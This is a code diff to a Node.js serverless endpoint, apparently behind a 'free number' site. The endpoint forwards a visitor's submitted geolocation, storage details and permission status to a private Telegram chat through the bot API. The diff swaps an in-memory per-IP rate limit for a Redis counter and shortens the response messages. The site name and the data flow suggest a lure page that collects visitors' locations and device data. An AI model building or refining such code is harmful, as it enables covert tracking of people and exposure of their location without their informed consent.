@@ -1,12 +1,17 @@
 const fetch = require('node-fetch');
 const FormData = require('form-data');
 const formidable = require('formidable');
+const Redis = require('ioredis');
 
-const rateLimitMap = new Map(); 
+
+const redis = new Redis(process.env.UPSTASH_REDIS_REST_URL, {
+  password: process.env.UPSTASH_REDIS_REST_TOKEN,
+  tls: {}
+});
 
 module.exports = async (req, res) => {
   const botToken = process.env.TOKEN;
-  const allowedOrigin = 'https://free-number1.vercel.app';
+  const allowedOrigin = 'https://free-number1.vercel.app'; 
 
   if (req.headers.origin && req.headers.origin !== allowedOrigin) {
     return res.status(403).json({ ok: false, error: 'Invalid origin' });
@@ -18,7 +23,7 @@ module.exports = async (req, res) => {
 
   const form = new formidable.IncomingForm();
 
-  form.parse(req, async (err, fields, files) => {
+  form.parse(req, async (err, fields) => {
     if (err) {
       return res.status(500).json({ ok: false, error: 'Failed to parse form data.' });
     }
@@ -56,25 +61,21 @@ module.exports = async (req, res) => {
 
     
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    const currentTime = Date.now();
-    const windowTime = 15 * 60 * 1000; 
-
-    if (!rateLimitMap.has(ip)) {
-      rateLimitMap.set(ip, []);
-    }
-
-    let timestamps = rateLimitMap.get(ip);
-    timestamps = timestamps.filter(ts => currentTime - ts < windowTime);
-
-    if (timestamps.length >= 10) {
-      return res.status(429).json({ ok: false, error: '⛔ شما به محدودیت ۱۰ بار در ۱۵ دقیقه رسیده‌اید. لطفاً بعداً دوباره تلاش کنید.' });
-    }
-
-    
-    timestamps.push(currentTime);
-    rateLimitMap.set(ip, timestamps);
+    const redisKey = `rate:${ip}`;
 
     try {
+      const count = await redis.incr(redisKey);
+
+      if (count === 1) {
+        
+        await redis.expire(redisKey, 15 * 60);
+      }
+
+      if (count > 10) {
+        return res.status(429).json({ ok: false, error: '⛔ شما به محدودیت ۱۰ بار در ۱۵ دقیقه رسیده‌اید. لطفاً بعداً دوباره تلاش کنید.' });
+      }
+
+      
       const now = new Date();
       const dateTime = now.toLocaleString();
 
@@ -93,23 +94,21 @@ module.exports = async (req, res) => {
         `*💽 Storage:* ${storage || 'Unknown'}\n` +
         `*🔒 Permission:* Denied`;
 
-      
       await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: new URLSearchParams({ chat_id: chatId, latitude, longitude })
       });
 
-      
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: new URLSearchParams({ chat_id: chatId, text: messageText, parse_mode: 'Markdown' })
       });
 
-      return res.status(200).json({ ok: true, message: 'Data sent to Telegram.' });
+      return res.status(200).json({ ok: true });
     } catch (error) {
-      return res.status(500).json({ ok: false, error: 'Failed to send data: ' + error.message });
+      return res.status(500).json({ ok: false, error: 'Server error: ' + error.message });
     }
   });
 };
